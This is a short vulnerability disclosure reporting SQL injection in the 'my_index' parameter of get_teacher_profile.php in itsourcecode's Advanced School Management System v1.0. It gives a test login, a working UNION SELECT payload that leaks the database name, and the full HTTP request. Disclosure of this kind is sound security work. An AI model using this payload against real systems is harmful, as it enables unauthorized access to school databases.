# Advanced School Management System v1.0 by itsourcecode.com has SQL injection

**Login account:** 

​		username：suarez081119@gmail.com

​		password：12345

**vendors:** https://itsourcecode.com/free-projects/php-project/advanced-school-management-system-in-php-with-source-code/

**Vulnerability url:** /school/model/get_teacher_profile.php?my_index=

**Vulnerability location:** /school/model/get_teacher_profile.php

**[+] Payload:** /school/model/get_teacher_profile.php?my_index=1'%20union%20select%20database()%2c2%2c3%2c4%2c5%2c6%2c7%2c8%2c9%2c10%20limit%201%2c1%23

​	Leak place : my_index

**Current database name:** std_db, length is 6

**Request package**：get teacher profile information

```
GET /school/model/get_teacher_profile.php?my_index=1'%20union%20select%20database()%2c2%2c3%2c4%2c5%2c6%2c7%2c8%2c9%2c10%20limit%201%2c1%23 HTTP/1.1
Host: 10.12.171.4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: */*
Referer: http://10.12.171.4/school/view/teacher_profile2.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=cp26rmntdlbhle8qiofns95sv7
Connection: close
```

**SQL injection result**：line 13 database name is displayed.

![sql_injection2](https://github.com/Renrao/bug_report/blob/master/blob/main/vendors/itsourcecode.com/advanced-school-management-system/images/sql_injection2.png)